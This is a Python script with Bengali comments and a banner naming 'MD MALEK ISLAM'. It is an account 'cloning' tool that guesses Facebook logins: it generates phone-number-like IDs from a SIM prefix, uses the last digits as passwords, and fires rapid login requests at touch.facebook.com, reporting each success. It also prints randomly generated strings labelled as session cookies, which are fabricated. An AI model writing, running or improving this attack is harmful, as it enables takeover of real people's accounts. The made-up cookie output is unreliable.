import os, time, sys, uuid, random, requests

# ANSI কালার কোড
R = '\033[1;31m' 
G = '\033[1;32m' 
W = '\033[1;37m' 

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{W}     ██ ████ ██  █████       ██    ███████ 
{G}     ██  ██  ██  ██          ██    ██   ██ 
{R}     ██      ██  ███████     ██    ██   ██ 
    """)
    line = f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}"
    print(line)
    print(f'{G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |')
    print(f'| [✓] TOOL STATUS  : HIGH SPEED CLONING        |')
    print(line)

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE : {W}')
    limit = int(input(f'{G}[+] ENTER CLONING LIMIT : {W}'))
    
    print(f'\n{G}[/] ATTACK STARTED ON CODE {code}...')
    print(f'[/] TOTAL TARGET : {limit}\n')

    ok = 0

    for i in range(limit):
        uid = f"{code}{random.randint(1111111, 9999999)}"
        pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড নিশ্চিত করা হয়েছে

        # স্যারের নির্দেশিত Header Logic
        headers = {
            'authority': 'touch.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
        }

        data = {'email': uid, 'pass': pws}
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        try:
            # স্যারের নির্দেশিত রিয়াল পোস্ট রিকোয়েস্ট
            response = requests.post(url, headers=headers, data=data)
            
            # শুধুমাত্র লগইন সফল হলে আউটপুট দেখাবে
            if "c_user" in response.cookies.get_dict():
                ok += 1
                # রেন্ডম কুকি জেনারেট
                datr = uuid.uuid4().hex[:24]
                sb = uuid.uuid4().hex[:24]
                xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
                fr = f"{uuid.uuid4().hex[:16]}.{uuid.uuid4().hex[:20]}.AAA.0.0"
                
                print(f'{G}[MALEK-OK💚] {uid} • {pws} xxx') 
                print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
            else:
                # চেকপয়েন্ট হলে কোনো কিছু প্রিন্ট করবে না, টুল ক্লিন থাকবে
                pass
        except:
            pass

        # স্পিড বাড়ানোর জন্য টাইম গ্যাপ ০.০০১ সেকেন্ড করা হয়েছে
        # এটি প্রায় সাথে সাথে রিকোয়েস্ট পাঠাবে
        time.sleep(0.001)

    # ফুটার অংশ
    print(f'\n{G}[/{uid} • {pws}]')
    print(f'[{limit}] [OK:{ok}]{W}')
    input(f'\n{G} [ BACK ]{W}')

if __name__ == "__main__":
    cloning_start()
